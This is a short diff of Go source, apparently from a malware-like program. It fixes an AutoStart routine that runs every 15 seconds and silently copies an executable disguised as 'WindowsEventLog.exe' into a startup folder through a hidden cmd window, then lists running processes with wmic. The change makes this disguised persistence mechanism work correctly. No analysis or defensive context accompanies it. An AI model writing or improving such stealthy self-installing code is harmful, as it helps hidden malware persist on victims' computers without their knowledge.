@@ -197,12 +197,14 @@ func KillMain() {
 func AutoStart() {
 	for {
 		ticker := time.NewTicker(15 * time.Second)
-		if FileExits(CURRENTPATH+"WindowsEventLog.exe") != nil {
-			if FileExits(AUTOSTART+"WindowsEventLog.exe") != nil {
-				move := exec.Command("cmd", "/C", "copy", "/s", "/q", CURRENTPATH+"WindowsEventLog.exe", AUTOSTART+"WindowsEventLog.exe")
+		des := AUTOSTART + "WindowsEventLog.exe"
+		src := CURRENTPATH + "WindowsEventLog.exe"
+		if FileExits(CURRENTPATH+"WindowsEventLog.exe") == nil {
+			if FileExits(des) != nil {
+				move := exec.Command("cmd", "/C", "copy", "/Y", src, des)
 				move.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 				// not Start will continue
-				move.Run()
+				move.Start()
 			}
 			buf := bytes.Buffer{}
 			cmd := exec.Command("wmic", "process", "get", "name,processid")
